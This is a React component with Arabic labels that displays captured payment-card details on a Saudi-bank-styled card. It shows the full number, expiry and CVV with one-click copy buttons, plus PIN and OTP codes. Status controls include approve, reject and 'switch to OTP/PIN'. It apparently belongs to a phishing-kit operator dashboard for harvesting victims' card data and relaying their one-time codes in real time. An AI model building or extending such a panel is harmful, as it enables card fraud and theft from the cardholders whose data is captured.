"use client"

import { ReactNode, useEffect, useRef, useState } from "react"
import { toast } from "sonner"

interface DataBubbleProps {
  title: string
  data: Record<string, any>
  timestamp?: string | Date
  status?: "pending" | "approved" | "rejected"
  pendingAction?: string | null
  showActions?: boolean
  isLatest?: boolean
  actions?: ReactNode
  icon?: string
  color?: "blue" | "green" | "purple" | "orange" | "pink" | "indigo" | "gray"
  layout?: "vertical" | "horizontal"
}

type CopyableCardField = "cardNumber" | "expiryDate" | "cvv"

const copyFieldLabels: Record<CopyableCardField, string> = {
  cardNumber: "رقم البطاقة",
  expiryDate: "تاريخ الانتهاء",
  cvv: "CVV"
}

const getBankLogoUrl = (bankName: string): string | null => {
  const n = (bankName || "").toLowerCase()
  if (n.includes("أهلي") || n.includes("ahli") || n.includes("snb") || n.includes("national")) return "/logo-snb.png"
  if (n.includes("راجح") || n.includes("rajhi")) return "/logo-rajhi.png"
  if (n.includes("رياض") || n.includes("riyad")) return "/logo-riyad.jpg"
  if (n.includes("إنماء") || n.includes("انماء") || n.includes("alinma")) return "/logo-alinma.png"
  return null
}

const getNetworkLogoUrl = (brand: string): string | null => {
  if (brand === "MADA") return "/logo-mada.png"
  if (brand === "VISA") return "/logo-visa.png"
  if (brand === "MASTERCARD") return "/logo-mastercard.png"
  return null
}

export function DataBubble({
  title,
  data,
  timestamp,
  status,
  pendingAction,
  showActions,
  isLatest,
  actions,
  icon,
  color: _color,
  layout: _layout = "vertical"
}: DataBubbleProps) {
  const [copiedField, setCopiedField] = useState<CopyableCardField | null>(null)
  const copyResetTimeoutRef = useRef<number | null>(null)

  useEffect(() => {
    return () => {
      if (copyResetTimeoutRef.current) window.clearTimeout(copyResetTimeoutRef.current)
    }
  }, [])

  const isCopyableValue = (value: string) => {
    const t = value.trim()
    return !(!t || t.includes("•") || t.includes("*") || t === "غير محدد")
  }

  const copyWithFallback = async (value: string) => {
    const normalized = value.trim()
    if (!normalized || typeof window === "undefined") return false
    const fallback = () => {
      const el = document.createElement("textarea")
      el.value = normalized
      el.setAttribute("readonly", "")
      el.style.cssText = "position:fixed;top:-1000px;opacity:0"
      document.body.appendChild(el)
      el.focus()
      el.select()
      const ok = document.execCommand("copy")
      document.body.removeChild(el)
      return ok
    }
    if (navigator.clipboard && window.isSecureContext) {
      try { await navigator.clipboard.writeText(normalized); return true } catch { return fallback() }
    }
    return fallback()
  }

  const handleCopy = async (field: CopyableCardField, value: string) => {
    if (!isCopyableValue(value)) { toast.error("لا توجد قيمة قابلة للنسخ"); return }
    const ok = await copyWithFallback(value)
    if (!ok) { toast.error("تعذر نسخ القيمة"); return }
    setCopiedField(field)
    if (copyResetTimeoutRef.current) window.clearTimeout(copyResetTimeoutRef.current)
    copyResetTimeoutRef.current = window.setTimeout(() => {
      setCopiedField(c => c === field ? null : c)
    }, 1500)
    toast.success(`تم نسخ ${copyFieldLabels[field]}`)
  }

  const getStatusBadge = () => {
    // Show pending action if available (immediate feedback during processing)
    if (pendingAction) {
      return (
        <span className="inline-flex items-center px-2.5 py-1 rounded-lg text-xs font-semibold border bg-blue-50 text-blue-700 border-blue-200 animate-pulse">
          {pendingAction}
        </span>
      )
    }
    if (!status) return null
    const badges: Record<string, { text: string; className: string }> = {
      pending:           { text: "⏳ قيد المراجعة", className: "bg-yellow-50 text-yellow-700 border-yellow-200" },
      approved:          { text: "✓ تم القبول",     className: "bg-green-50 text-green-700 border-green-200" },
      rejected:          { text: "✗ تم الرفض",      className: "bg-red-50 text-red-600 border-red-200" },
      approved_with_otp: { text: "🔑 تحول OTP",     className: "bg-blue-50 text-blue-700 border-blue-200" },
      approved_with_pin: { text: "🔐 تحول PIN",     className: "bg-purple-50 text-purple-700 border-purple-200" },
      resend:            { text: "🔄 إعادة إرسال",  className: "bg-orange-50 text-orange-700 border-orange-200" },
      message:           { text: "📲 في انتظار الموافقة", className: "bg-amber-50 text-amber-700 border-amber-200 animate-pulse" },
    }
    const badge = badges[status]
    if (!badge) return null
    return (
      <span className={`inline-flex items-center px-2.5 py-1 rounded-lg text-xs font-semibold border ${badge.className}`}>
        {badge.text}
      </span>
    )
  }

  const formatTimestamp = (ts: string | Date) => {
    const d = new Date(ts)
    const mm = String(d.getMonth() + 1).padStart(2, "0")
    const dd = String(d.getDate()).padStart(2, "0")
    let h = d.getHours()
    const min = String(d.getMinutes()).padStart(2, "0")
    const ampm = h >= 12 ? "م" : "ص"
    h = h % 12 || 12
    return `${mm}-${dd} | ${h}:${min} ${ampm}`
  }

  const isCardData = title === "معلومات البطاقة" || !!data["رقم البطاقة"] || !!data["نوع البطاقة"]

  if (isCardData) {
    const rawNum     = (data["رقم البطاقة"] || "").toString().replace(/\s+/g, "")
    const cardNumber = rawNum ? (rawNum.match(/.{1,4}/g)?.join("  ") || rawNum) : "••••  ••••  ••••  ••••"
    const rawExpiry  = (data["تاريخ الانتهاء"] || "").toString().trim()
    const expiry     = rawExpiry || "••/••"
    const rawCvv     = (data["CVV"] || "").toString().trim()
    const cvv        = rawCvv || "•••"
    const holder     = data["اسم حامل البطاقة"] || "CARD HOLDER"
    const cardType   = (data["نوع البطاقة"] || "CARD").toString().toUpperCase()
    const cardLevel  = (data["مستوى البطاقة"] || "").toString().trim()
    const bankName   = data["البنك"] || ""
    const bankCountry = data["بلد البنك"] || ""

    const typeLower  = cardType.toLowerCase()
    let brand = "CARD"
    if (typeLower.includes("visa"))   brand = "VISA"
    else if (typeLower.includes("master")) brand = "MASTERCARD"
    else if (typeLower.includes("mada"))   brand = "MADA"
    else if (typeLower.includes("amex") || typeLower.includes("american")) brand = "AMEX"

    const bankLogoUrl = getBankLogoUrl(bankName)
    const networkLogoUrl = getNetworkLogoUrl(brand)

    return (
      <div className="bg-white rounded-2xl overflow-hidden shadow-[0_2px_12px_rgba(0,0,0,0.07)] border border-gray-100" style={{ fontFamily: "Cairo, Tajawal, sans-serif" }}>

        {/* Bubble header */}
        <div className="flex items-center justify-between px-4 py-2.5 border-b border-gray-100">
          <div className="flex items-center gap-2">
            {isLatest && (
              <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-full">الأحدث</span>
            )}
            {timestamp && (
              <span className="text-[11px] text-gray-400">{formatTimestamp(timestamp)}</span>
            )}
          </div>
          <span className="text-sm font-bold text-gray-800">{title}</span>
        </div>

        <div className="p-4">
          {/* ─── Credit Card Visual (SNB-style light card) ─── */}
          <div
            className="relative rounded-2xl overflow-hidden"
            style={{
              aspectRatio: "1.78 / 1",
              background: "linear-gradient(135deg, #e8f5ee 0%, #ddf0e6 35%, #cce8d8 65%, #e2f0e8 100%)",
              boxShadow: "0 6px 24px rgba(0,100,50,0.12), 0 2px 6px rgba(0,0,0,0.06)"
            }}
          >
            {/* Sheen overlay */}
            <div className="absolute inset-0 pointer-events-none" style={{ background: "linear-gradient(135deg, rgba(255,255,255,0.45) 0%, transparent 55%)" }} />

            {/* Card inner content */}
            <div className="relative h-full flex flex-col px-5 py-4">

              {/* Top row: SAR badge only */}
              <div className="flex items-start justify-end">
                <div
                  className="text-xs font-bold text-gray-700"
                  style={{ border: "1.5px solid #555", borderRadius: "7px", padding: "2px 10px", background: "rgba(255,255,255,0.55)" }}
                >
                  SAR
                </div>
              </div>

              {/* Card Number + Expiry (same row) */}
              <div className="flex items-center justify-between mt-3">
                <button
                  type="button"
                  onClick={() => void handleCopy("cardNumber", rawNum)}
                  disabled={!isCopyableValue(rawNum)}
                  title="نسخ رقم البطاقة"
                  className="group text-left"
                >
                  <div className="font-mono font-bold tracking-widest text-gray-900 text-2xl group-hover:opacity-70 transition-opacity" style={{ direction: "ltr" }}>
                    {cardNumber}
                  </div>
                  <div className="text-[9px] text-gray-500 mt-0.5 opacity-0 group-hover:opacity-70 transition-opacity">
                    {copiedField === "cardNumber" ? "✓ تم النسخ" : "انقر للنسخ"}
                  </div>
                </button>
                <button
                  type="button"
                  onClick={() => void handleCopy("expiryDate", rawExpiry)}
                  disabled={!isCopyableValue(rawExpiry)}
                  title="نسخ تاريخ الانتهاء"
                  className="group text-right"
                >
                  <div className="font-mono font-bold text-gray-900 text-2xl group-hover:opacity-70 transition-opacity" style={{ direction: "ltr" }}>
                    {copiedField === "expiryDate" ? "✓" : expiry}
                  </div>
                </button>
              </div>

              {/* Bank logo / name + CVV */}
              <div className="flex items-end justify-between mt-2">
                <div>
                  {bankLogoUrl ? (
                    <div
                      style={{
                        background: "#fff",
                        borderRadius: "8px",
                        padding: "3px 8px",
                        display: "inline-flex",
                        alignItems: "center",
                        boxShadow: "0 1px 4px rgba(0,0,0,0.08)"
                      }}
                    >
                      <img
                        src={bankLogoUrl}
                        alt={bankName}
                        className="h-7 max-w-[120px] object-contain"
                      />
                    </div>
                  ) : (
                    <span
                      className="font-extrabold text-green-900 leading-tight"
                      style={{ fontSize: "15px", direction: "ltr", maxWidth: "160px" }}
                    >
                      {bankName && bankName !== "غير محدد" ? bankName : ""}
                    </span>
                  )}
                </div>
                <button
                  type="button"
                  onClick={() => void handleCopy("cvv", rawCvv)}
                  disabled={!isCopyableValue(rawCvv)}
                  title="نسخ CVV"
                  className="group text-right"
                >
                  <div className="text-[10px] text-gray-500 mb-0.5 tracking-wide">CVV</div>
                  <div className="font-mono font-bold text-gray-900 text-2xl group-hover:opacity-70 transition-opacity" style={{ direction: "ltr" }}>
                    {copiedField === "cvv" ? "✓" : cvv}
                  </div>
                </button>
              </div>

              {/* Bottom row: Saudi flag + card type + level + network logo */}
              <div className="flex items-center justify-between mt-auto pt-1">
                <span className="text-xl">🇸🇦</span>
                <div className="flex items-center gap-2">
                  {(cardLevel || (brand !== "CARD" && !networkLogoUrl)) && (
                    <span className="text-[10px] font-bold text-gray-600 uppercase tracking-wide">
                      {[
                        !networkLogoUrl && brand !== "CARD" ? brand : null,
                        cardLevel || null
                      ].filter(Boolean).join(" · ")}
                    </span>
                  )}
                  {networkLogoUrl ? (
                    <img src={networkLogoUrl} alt={brand} className="h-7 max-w-[72px] object-contain" />
                  ) : brand !== "CARD" ? (
                    <span className="text-xs font-black text-gray-700 uppercase">{brand}</span>
                  ) : null}
                </div>
              </div>
            </div>
          </div>

          {/* ─── Tags below card ─── */}
          <div className="mt-3 flex flex-wrap gap-1.5">
            {bankName && bankName !== "غير محدد" && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-blue-50 text-blue-700 border border-blue-100">{bankName}</span>
            )}
            {bankCountry && bankCountry !== "غير محدد" && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-indigo-50 text-indigo-700 border border-indigo-100">{bankCountry}</span>
            )}
            {cardType && cardType !== "CARD" && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-gray-100 text-gray-700 border border-gray-200">{cardType}</span>
            )}
            {cardLevel && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-amber-50 text-amber-700 border border-amber-100">{cardLevel}</span>
            )}
          </div>
        </div>

        {/* ─── Footer: status + actions ─── */}
        {(status || (showActions && actions)) && (
          <div className="flex items-center justify-between gap-2 px-4 py-3 border-t border-gray-100 bg-gray-50/60">
            <div>{getStatusBadge()}</div>
            {showActions && actions && <div>{actions}</div>}
          </div>
        )}
      </div>
    )
  }

  // ─────────────────────────────────────────
  // PIN / OTP digit boxes
  // ─────────────────────────────────────────
  const isPinOrOtp =
    title.includes("PIN") || title.includes("OTP") ||
    title.includes("رمز") || title.includes("كود") || title.includes("كلمة مرور")

  let digitValue = ""
  if (isPinOrOtp) {
    const entries = Object.entries(data)
    if (entries.length > 0) digitValue = entries[0][1]?.toString() || ""
  }

  return (
    <div
      className="bg-white rounded-2xl overflow-hidden shadow-[0_2px_12px_rgba(0,0,0,0.06)] border border-gray-100"
      style={{ fontFamily: "Cairo, Tajawal, sans-serif" }}
    >
      {/* Header */}
      <div className="flex items-center justify-between px-4 py-2.5 border-b border-gray-100">
        <div className="flex items-center gap-2">
          {isLatest && (
            <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-full">الأحدث</span>
          )}
          {timestamp && (
            <span className="text-[11px] text-gray-400">{formatTimestamp(timestamp)}</span>
          )}
        </div>
        <div className="flex items-center gap-2">
          {icon && <span className="text-base">{icon}</span>}
          <span className="text-sm font-bold text-gray-800">{title}</span>
        </div>
      </div>

      {/* Body */}
      <div className="px-4 py-4">
        {isPinOrOtp && digitValue ? (
          <div className="flex justify-center gap-1.5 py-2" style={{ direction: "ltr" }}>
            {digitValue.split("").map((digit, i) => (
              <div
                key={i}
                className="w-9 h-11 rounded-lg bg-gray-50 border border-gray-200 shadow-sm flex items-center justify-center"
              >
                <span className="text-xl font-bold text-gray-900">{digit}</span>
              </div>
            ))}
          </div>
        ) : (
          <div className="space-y-3">
            {Object.entries(data).map(([key, value]) => {
              if (value === undefined || value === null) return null
              const str = value?.toString() || "-"
              return (
                <div key={key} className="flex flex-col gap-1">
                  <span className="text-gray-500 text-xs font-medium">{key}:</span>
                  <span className="text-gray-900 font-semibold text-sm break-words">{str}</span>
                </div>
              )
            })}
          </div>
        )}
      </div>

      {/* Footer */}
      {(status || (showActions && actions)) && (
        <div className="flex items-center justify-between gap-2 px-4 py-3 border-t border-gray-100 bg-gray-50/60">
          <div>{getStatusBadge()}</div>
          {showActions && actions && <div>{actions}</div>}
        </div>
      )}
    </div>
  )
}
